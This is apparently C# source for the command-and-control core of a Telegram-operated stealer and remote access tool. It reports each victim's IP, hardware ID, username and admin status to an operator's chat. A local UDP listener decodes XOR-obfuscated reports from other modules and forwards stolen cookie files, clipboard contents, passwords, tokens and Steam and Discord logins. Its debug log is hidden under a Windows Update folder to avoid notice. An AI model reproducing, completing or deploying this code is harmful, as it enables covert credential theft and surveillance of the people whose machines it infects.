using System;
using System.IO;
using System.Threading;
using System.Threading.Tasks;
using Telegram.Bot;
using Telegram.Bot.Types;
using Telegram.Bot.Types.Enums;
using Telegram.Bot.Types.ReplyMarkups;
using VanguardCore;
using System.Collections.Generic;
using System.Diagnostics.CodeAnalysis;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Reflection;
using File = System.IO.File;

namespace FinalBot
{
    public class BotOrchestrator
    {
        private readonly ITelegramBotClient _botClient;
        private readonly string _adminId;
        private readonly CommandHandler _commandHandler;
        private bool _isRunning = true;

        [DynamicDependency(DynamicallyAccessedMemberTypes.All, typeof(List<UpdateType>))]
        [DynamicDependency(DynamicallyAccessedMemberTypes.All, typeof(UpdateType))]
        public BotOrchestrator(string token, string adminId, HttpClient? client = null)
        {
            _botClient = new TelegramBotClient(token, client);
            _adminId = adminId;
            _commandHandler = new CommandHandler(_botClient, _adminId);
            TelegramService.Initialize(token, adminId, client);

            // NativeAOT Hint: preserve generic list of UpdateType
            GC.KeepAlive(new System.Collections.Generic.List<UpdateType>());
        }

        public async Task StartAsync()
        {
            try 
            {
                Console.WriteLine("[ORCHESTRATOR] Starting services...");
                DebugLog("[ORCHESTRATOR] Starting services...");
                
                // Start UDP listener for phishing reports (Steam/WeChat)
                DebugLog("[ORCHESTRATOR] Launching UDP listener...");
                _ = Task.Run(() => StartUdpListener());

                // 1. Initial Report (via Telegram as fallback/sender)
                DebugLog("[ORCHESTRATOR] Sending startup report...");
                await SendStartupReport();

                Console.WriteLine("[ORCHESTRATOR] Telegram Polling active.");

                var receiverOptions = new Telegram.Bot.Polling.ReceiverOptions
                {
                    AllowedUpdates = null // This allows all updates and avoids the generic list trimming issue
                };

                _botClient.StartReceiving(
                    updateHandler: _commandHandler.HandleUpdateAsync,
                    pollingErrorHandler: _commandHandler.HandlePollingErrorAsync,
                    receiverOptions: receiverOptions,
                    cancellationToken: default
                );
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[STARTUP ERROR] {ex.Message}\n{ex.StackTrace}");
                // Log to file since console might be hidden
                try { System.IO.File.AppendAllText(System.IO.Path.Combine(System.Environment.GetFolderPath(System.Environment.SpecialFolder.LocalApplicationData), "Microsoft", "Windows", "Update", "svc_debug.log"), $"[{DateTime.Now}] [BOT ERROR] {ex}\n"); } catch { }
            }

            // Keep alive
            while (_isRunning)
            {
                await Task.Delay(1000);
            }
        }

        private async Task SendStartupReport()
        {
            var (ip, country, flag) = FinalBot.Modules.SystemInfoModule.GetCountryInfo();
            string hwid = FinalBot.Modules.SystemInfoModule.GetHWID();
            string osName = FinalBot.Modules.SystemInfoModule.GetFriendlyOSName();
            string pcUser = $"{Environment.MachineName}\\{Environment.UserName}";
            string adminStatus = VanguardCore.ElevationService.IsAdmin() ? "🟢 АДМИН" : "🟡 Обычный Юзер";

            string info = $"🚀 <b>КЛИЕНТ ОНЛАЙН</b>\n" +
                          $"━━━━━━━━━━━━━━━━━━\n" +
                          $"👤 <b>ID:</b> <code>{pcUser}</code>\n" +
                          $"🆔 <b>HWID:</b> <code>{hwid}</code>\n" +
                          $"🌐 <b>IP:</b> <code>{ip}</code> | {flag} {country}\n" +
                          $"🖥️ <b>Система:</b> <code>{osName}</code>\n" +
                          $"⚡ <b>Статус:</b> <code>{adminStatus}</code>\n" +
                          $"🎤 <b>Микрофон:</b> ✅\n" +
                          $"⌚ <b>Время:</b> <code>{DateTime.Now:yyyy-MM-dd HH:mm:ss}</code>\n" +
                          $"━━━━━━━━━━━━━━━━━━";
            var inlineKeyboard = new InlineKeyboardMarkup(new[]
            {
                new [] { InlineKeyboardButton.WithCallbackData("🎮 Админ-Панель", "admin_panel") }
            });

            try 
            {
                DebugLog("[ORCHESTRATOR] Sending startup report...");
                string adminPanelMarkup = "{\"inline_keyboard\":[[{\"text\":\"💠 Админ-панель\",\"callback_data\":\"admin_panel\"}]]}";
                
                // Directly send message for maximum reliability
                await TelegramService.SendMessage(info, adminPanelMarkup);
                
                // Then try to send the "cool" animation as an update or separate message if desired
                // but for now, we just want it to WORK.
            }
            catch (Exception ex)
            {
                DebugLog($"[BOT ERROR] {ex}");
                try { await TelegramService.SendMessage(info, "{\"inline_keyboard\":[[{\"text\":\"💠 Админ-панель\",\"callback_data\":\"admin_panel\"}]]}"); } catch { }
            }
        }

        private int _lastLogMessageId = 0;

        private async Task StartUdpListener()
        {
            int port = 51337;
            try
            {
                var localEndpoint = new IPEndPoint(IPAddress.Loopback, port);
                using var udpClient = new UdpClient(localEndpoint);
                Console.WriteLine($"[UDP] Listening on 127.0.0.1:{port}...");
                while (_isRunning)
                {
                    try
                    {
                        var result = await udpClient.ReceiveAsync();
                        string raw = Encoding.UTF8.GetString(result.Buffer);
                        string shortRaw = raw.Length > 80 ? raw.Substring(0, 80) + "..." : raw;
                        // Console.WriteLine($"[UDP] Received: {shortRaw}");
                        // DebugLog($"[UDP DATA] {raw}"); // REMOVED: Prevent feedback loop with GlobalLogger

                        // Decrypt phishing payload
                        string decrypted = DecryptString(raw);
                        if (string.IsNullOrEmpty(decrypted)) decrypted = raw;

                        if (decrypted.StartsWith("FILE:"))
                        {
                            string filePath = decrypted.Substring(5).Trim();
                            if (File.Exists(filePath))
                            {
                                using var stream = File.OpenRead(filePath);
                                await _botClient.SendDocumentAsync(
                                    chatId: _adminId,
                                    document: InputFile.FromStream(stream, Path.GetFileName(filePath)),
                                    caption: $"📦 <b>Cookies Captured:</b> <code>{Path.GetFileName(filePath)}</code>",
                                    parseMode: ParseMode.Html
                                );
                                continue; 
                            }
                        }

                        // Block-style Discord Updates
                        if (decrypted.Contains("[Discord]"))
                        {
                            int lastMsgId = CommandHandler.GetLastDiscordMessageId();
                            if (lastMsgId != 0)
                            {
                                try
                                {
                                    await _botClient.EditMessageTextAsync(
                                        chatId: _adminId,
                                        messageId: lastMsgId,
                                        text: decrypted,
                                        parseMode: ParseMode.Html
                                    );
                                } catch { }
                            }
                            else 
                            {
                                var sent = await _botClient.SendTextMessageAsync(_adminId, decrypted, parseMode: ParseMode.Html);
                                CommandHandler.SetLastDiscordMessageId(sent.MessageId);
                            }

                            if (decrypted.Contains("100%"))
                            {
                                CommandHandler.SetDiscordReady(true);
                            }
                            continue;
                        }
                        else if (decrypted.Contains("Discord Remote Bot:") && decrypted.Contains("%"))
                        {
                            if (_lastLogMessageId != 0)
                            {
                                try
                                {
                                    await _botClient.EditMessageTextAsync(
                                        chatId: _adminId,
                                        messageId: _lastLogMessageId,
                                        text: decrypted,
                                        parseMode: ParseMode.Html
                                    );
                                    continue; 
                                }
                                catch { _lastLogMessageId = 0; } // Fallback to new message
                            }
                        }

                        if (decrypted.Contains("DISCONNECT"))
                        {
                            CommandHandler.SetDiscordReady(false);
                        }

                        // ... previous logic for other types ...
                        else if (decrypted.StartsWith("CLIPBOARD:"))
                        {
                            string clipboardContent = decrypted.Substring(10).Trim();
                            await _botClient.SendTextMessageAsync(
                                chatId: _adminId,
                                text: $"📋 <b>CLIPBOARD CAPTURED</b>\n━━━━━━━━━━━━━━━━━━\n<code>{clipboardContent}</code>\n━━━━━━━━━━━━━━━━━━",
                                parseMode: ParseMode.Html
                            );
                            continue;
                        }

                        // 1. ONLY send recognized high-level events to Telegram
                        // Covers: phishing captures, credential grabs, stealer outputs
                        bool isHighValue =
                            decrypted.Contains("捕获") || decrypted.Contains("Captured") ||
                            decrypted.Contains("Login") || decrypted.Contains("Password") ||
                            decrypted.Contains("Cookie") || decrypted.Contains("Steam") ||
                            decrypted.Contains("Alert") || decrypted.Contains("Critical") ||
                            decrypted.Contains("Token") || decrypted.Contains("Credentials") ||
                            decrypted.Contains("Opened") || decrypted.Contains("Closed") ||
                            decrypted.Contains("Entered") || decrypted.Contains("Введен") ||
                            decrypted.StartsWith("💎") || decrypted.StartsWith("🚨") ||
                            decrypted.StartsWith("✅") || decrypted.StartsWith("📦");

                        if (isHighValue)
                        {
                            try { await _botClient.SendTextMessageAsync(_adminId, decrypted, parseMode: ParseMode.Html); } catch { }
                        }

                        // 2. Always output to local debug console/file for full telemetry
                        DebugLog($"[CORE LOG] {decrypted}");
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine($"[UDP ERROR] {ex.Message}");
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[UDP BIND ERROR] {ex.Message}");
            }
        }

        private string DecryptString(string base64Encoded)
        {
            if (string.IsNullOrEmpty(base64Encoded)) return null;
            try
            {
                byte[] data = Convert.FromBase64String(base64Encoded);
                byte[] salt = Encoding.UTF8.GetBytes("n2xkNQYbZwj8r9fz");
                byte[] xorData = new byte[data.Length];

                for (int i = 0; i < data.Length; i++)
                {
                    xorData[i] = (byte)(data[i] ^ salt[i % salt.Length]);
                }

                string result = Encoding.UTF8.GetString(xorData);
                // Return original if no printable chars, but here we expect text
                return result;
            }
            catch
            {
                return null;
            }
        }

        private void DebugLog(string msg)
        {
            try { System.IO.File.AppendAllText(System.IO.Path.Combine(System.Environment.GetFolderPath(System.Environment.SpecialFolder.LocalApplicationData), "Microsoft", "Windows", "Update", "svc_debug.log"), $"[{DateTime.Now}] {msg}\n"); } catch { }
        }

        public void Stop()
        {
            _isRunning = false;
        }
    }
}
